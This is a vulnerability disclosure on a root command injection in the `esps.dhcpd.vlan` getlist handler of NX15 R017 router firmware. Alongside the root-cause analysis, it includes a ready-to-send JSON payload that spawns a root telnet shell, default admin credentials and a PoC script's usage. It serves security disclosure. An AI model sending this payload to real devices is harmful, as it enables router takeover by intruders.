# NX15 R017 `esps.dhcpd.vlan.getlist` Post-Authentication Independent root RCE

## 1. Conclusion

On NX15 R017, the following `/api/esps` handler:

- `object = esps.dhcpd.vlan`
- `method = getlist`

contains a **new, independent, immediate-trigger post-authentication root RCE**.

- **Endpoint**: `POST /api/esps`
- **Object**: `esps.dhcpd.vlan`
- **Method**: `getlist`
- **Injection point**: VLAN name strings in `param.list[]`
- **Privilege requirement**: post-authentication administrator session
- **Impact**: arbitrary command execution as **root**
- **Verified device**: `192.168.8.1`, NX15 firmware `R017`
- **Status**: **Confirmed / Exploited**

This round of testing confirmed on a physical device that:

1. No single-quote bypass and no JSON Unicode `\u0027` technique is required.
2. Ordinary **`$()` command substitution** inside a normal string is sufficient to break through directly.
3. Even if the API ultimately returns `DHCP:Unknown VLAN` / `code=3083`, the attacker's command has already executed.
4. A single `esps.dhcpd.vlan.getlist` call is sufficient to spawn a root shell.

---

## 2. Root Cause Analysis

Target script:

- `/usr/libexec/rpcd/esps.dhcpd.vlan`

### 2.1 `getlist` directly reads attacker-controlled `list[]`

In the generic `getlist)` branch:

```sh
json_load "$param"
...
if json_is_a list array; then
    json_select list
    idx=1
    argcount=0
    while json_is_a ${idx} string
    do
        json_get_var vlan_name ${idx}
        eval vlan_name_list${idx}="$vlan_name"
        ...
```

Here, `vlan_name` comes from the user-controlled `param.list[]` and is not filtered for dangerous characters.

### 2.2 Actual dangerous sink

The core dangerous statement is:

```sh
eval vlan_name_list${idx}="$vlan_name"
```

Because `eval` is used here, the shell parses the concatenated string again.

If `vlan_name` is:

```text
VLAN1$(payload)
```

then `payload` is executed immediately during the `eval` stage.

In other words, this is not a chain that requires configuration to be written first and then triggered later; it is a chain where **the wrapper itself executes immediately**.

### 2.3 Business validation happens after command execution

After the dangerous `eval`, the script then performs the VLAN existence check:

```sh
vlan_id=$(printf '%s' "$vlan_name" | tr -d "VLAN")
check="$(uci get network.lan"$vlan_id".ipaddr)"
if [ -z "$check" ];then
    result=3083
    return_json $result
    return
fi
```

Therefore, even if the attack string causes the later `vlan_id` to become a nonexistent name, the API will only return:

```json
{"code":3083,"message":"DHCP:Unknown VLAN"}
```

At that point, however, the attacker's command has already finished executing.

### 2.4 This is wrapper-level RCE, not RCE in later business logic

The key points of this chain are:

1. The attacker command is already executed at `eval vlan_name_list...`.
2. The later VLAN existence check only changes the HTTP response value.
3. Even when the business operation fails, the RCE still succeeds.

Therefore, this should be classified as:

> **wrapper-level command injection in `esps.dhcpd.vlan.getlist` itself**

rather than a business-logic vulnerability that requires the VLAN to actually exist before triggering.

---

## 3. Key Static Evidence

### 3.1 User-controllable `list[]`

```sh
if json_is_a list array; then
    json_select list
    idx=1
    while json_is_a ${idx} string
    do
        json_get_var vlan_name ${idx}
```

### 3.2 Direct `eval` of user input

```sh
eval vlan_name_list${idx}="$vlan_name"
```

### 3.3 Validation occurs after the sink

```sh
vlan_id=$(printf '%s' "$vlan_name" | tr -d "VLAN")
check="$(uci get network.lan"$vlan_id".ipaddr)"
if [ -z "$check" ];then
    result=3083
    return_json $result
    return
fi
```

### 3.4 A secondary `eval` read also exists in the same file

The later output stage also contains:

```sh
json_add_string "intf" "$(eval echo '$'vlan_name_list"${i}")"
```

This shows that the overall path is unsafe. However, in this physical-device verification, **the first `eval vlan_name_list...` alone was already sufficient to achieve RCE**.

---

## 4. Exploitation Method

### 4.1 No raw single quote or raw-body bypass is required

This chain does not require:

- A raw literal single quote `'`.
- A `\u0027` bypass.
- Manually constructing a complex raw JSON body.

Command substitution can be placed directly into an ordinary JSON request:

```json
[
  {
    "id": 1,
    "object": "esps.dhcpd.vlan",
    "method": "getlist",
    "param": {
      "list": [
        "VLAN1$(echo DHCPD_VLAN_GETLIST_RCE_OK >/tmp/dhcpd_vlan_getlist_rce_marker; /usr/sbin/telnetd -p 2480 -l /bin/sh >/dev/null 2>&1)"
      ]
    }
  }
]
```

### 4.2 Expected API appearance

The API usually returns a business error, for example:

```json
[{"id":1,"result":{"message":"DHCP:Unknown VLAN","data":[],"code":3083}}]
```

This happens because the payload pollutes the VLAN name, causing the later existence check to fail.

However, this **does not mean exploitation failed**. On the contrary, it proves that:

- RCE occurs before the business-error response is returned.
- The response code cannot be used to determine whether exploitation failed.

---

## 5. Dynamic Verification

### 5.1 Login

Use administrator credentials:

- `admin / admin123`

Log in to `http://192.168.8.1/api/login/auth` to obtain a session.

### 5.2 Trigger request

Send:

```json
[
  {
    "id": 1,
    "object": "esps.dhcpd.vlan",
    "method": "getlist",
    "param": {
      "list": [
        "VLAN1$(echo DHCPD_VLAN_GETLIST_RCE_OK >/tmp/dhcpd_vlan_getlist_rce_marker; /usr/sbin/telnetd -p 2480 -l /bin/sh >/dev/null 2>&1)"
      ]
    }
  }
]
```

API response:

```json
[{"id":1,"result":{"message":"DHCP:Unknown VLAN","data":[],"code":3083}}]
```

### 5.3 Shell verification

Then connecting to `192.168.8.1:2480` produced:

```text
BusyBox v1.30.1 (2025-08-01 14:05:52 CST) built-in shell (ash)
/ # id; cat /tmp/dhcpd_vlan_getlist_rce_marker 2>/dev/null
uid=0(root) gid=0(root)
DHCPD_VLAN_GETLIST_RCE_OK
```

This proves that:

- The attack command was executed.
- The execution context was **root**.

### 5.4 Cleanup

After verification, the following cleanup was performed:

- Killed `telnetd -p 2480`.
- Deleted `/tmp/dhcpd_vlan_getlist_rce_marker`.

The port was then confirmed closed.

---

## 6. POC

Implemented POC:

- `poc/postauth_esps_dhcpd_vlan_getlist_rce.py`

Example:

```bash
python3 poc/postauth_esps_dhcpd_vlan_getlist_rce.py --cleanup --port 2481
```

This script:

1. Logs in to the admin interface.
2. Calls `esps.dhcpd.vlan.getlist`.
3. Injects a `VLAN1$(...)` payload.
4. Waits for the temporary telnet shell.
5. Verifies `id` and the marker.
6. Automatically cleans up when `--cleanup` is specified.

---

## 7. Impact Assessment

### 7.1 Security impact

After obtaining a backend administrator session, an attacker can:

- Execute arbitrary commands directly as root.
- Persist a backdoor.
- Modify network and firewall configuration.
- Export or destroy sensitive configuration.
- Take over the entire router.

### 7.2 Vulnerability characteristics

This chain is highly dangerous because:

1. **It triggers in a single request.**
2. **It does not rely on a single-quote bypass.**
3. **It still executes successfully even when the API returns an error.**
4. **The root cause is in the wrapper itself.**

This makes exploitation more direct and more stable.

---

## 8. Final Conclusion

`esps.dhcpd.vlan.getlist` provides a new **independent post-authentication root RCE**.

The root cause is:

```sh
eval vlan_name_list${idx}="$vlan_name"
```

which directly applies `eval` to user-controlled `list[]` entries. An attacker only needs to write the VLAN name as:

```text
VLAN1$(payload)
```

to trigger root command execution before business validation occurs.

Most importantly:

> **Even if the API ultimately returns `DHCP:Unknown VLAN`, the attacker's command has already executed successfully.**

Therefore, this is a confirmed, reliably reproducible **wrapper-level post-authentication root RCE**.
